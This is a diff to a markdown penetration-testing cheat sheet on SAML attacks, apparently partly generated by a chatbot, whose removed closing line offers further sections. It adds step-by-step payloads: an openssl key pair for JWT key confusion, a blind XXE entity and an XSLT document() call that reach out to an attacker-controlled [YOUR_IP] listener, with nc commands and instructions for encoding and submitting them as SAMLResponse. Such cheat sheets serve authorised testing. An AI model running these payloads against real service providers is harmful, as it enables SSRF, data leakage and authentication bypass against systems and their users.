@@ -19,11 +19,8 @@
 - **Step 1:** Generate Malicious RSA Pair:
     
     Bash
-    
-    ```
     openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
     openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
-    ```
     
 - **Step 2:** Use **CyberChef** (**PEM to JWK**) to convert `exploit_public.pem` to a JSON object.
     
@@ -126,11 +123,79 @@
 - **Logic:** The server validates the signature on the _original_ but the application processes the _first_ (malicious) assertion.
     
 
-### **3. Recommended Tool: SAML Raider (Burp Suite)**
 
-- Use to automate **Signature Removal** and **XSW Attacks (1-8)**.
+### **3. SAML XXE Injection (XML External Entity)**
+
+If the Service Provider’s XML parser is misconfigured to resolve external entities, you can trigger a "Blind" XXE to leak data or perform Server-Side Request Forgery (SSRF).
+
+- Step 1: Prepare your Listener
+    
+    Start a listener on your machine to confirm the outbound connection:
+    
+    Bash
+    
+    ```
+    nc -lnvp 8000
+    ```
+    
+- Step 2: Craft the Payload
+    
+    Define an external entity at the very beginning of the XML document:
+    
+    XML
+    
+    ```
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://[YOUR_IP]:8000"> %xxe; ]>
+    <samlp:Response> ... </samlp:Response>
+    ```
+    
+- **Step 3: Encode and Send**
+    
+    1. Take your raw XML with the payload.
+        
+    2. **Base64-encode** the entire string.
+        
+    3. **URL-encode** the resulting Base64 string.
+        
+    4. Submit it via the `SAMLResponse` parameter in a POST request.
+        
+- Step 4: Verify
+    
+    If you receive a GET / HTTP/1.1 connection on your listener, the server is vulnerable to XXE.
     
 
 ---
 
-**Would you like me to add a section on Common MFA Bypass techniques or rate-limiting bypasses to complete this cheat sheet?**
+### **4. XSLT Server-Side Injection**
+
+This attack targets the XML parser's ability to process **eXtensible Stylesheet Language Transformations**. If a parser handles these transformations unsafely, you can force the server to execute malicious logic or reach out to external servers.
+
+- Step 1: Craft the XSLT Payload
+    
+    Create a payload that uses the document() function to make an external request:
+    
+    XML
+    
+    ```
+    <?xml version="1.0" encoding="utf-8"?>
+    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+      <xsl:template match="/">
+        <xsl:copy-of select="document('http://[YOUR_IP]:8000/')"/>
+      </xsl:template>
+    </xsl:stylesheet>
+    ```
+    
+- **Step 2: Injection Methods**
+    
+    - **Method A (Direct):** Replace the entire `SAMLResponse` with the Base64/URL-encoded version of the payload above. (The server might error out, but the connection might still trigger).
+        
+    - **Method B (Embedded):** Inject the payload inside the `<ds:Transform>` node of a **valid** SAML response. This tests if the transformation is triggered only during the validation of a "legit" token.
+        
+- Step 3: Verify
+    
+    Check your listener (nc -lnvp 8000) for a connection. Even if the application returns an error (Access Denied), a successful connection confirms the vulnerability.
+    
+
+---
+
